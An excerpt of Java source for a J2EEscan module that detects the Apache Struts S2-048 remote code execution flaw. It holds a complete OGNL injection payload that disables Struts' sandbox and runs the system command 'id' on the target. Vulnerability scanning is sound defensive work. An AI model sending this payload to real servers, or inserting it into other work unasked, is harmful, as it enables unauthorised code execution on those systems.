...
public class StrutsS2048 implements IModule {

    private static final String TITLE = "Struts S2-048 RCE";
    private static final String DESCRIPTION = "J2EEscan identified  S2-048 RCE in the webpage"
    ...
    private static final List<byte[]> PAYLOAD_INJ = Arrays.asList(
            "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}".getBytes());
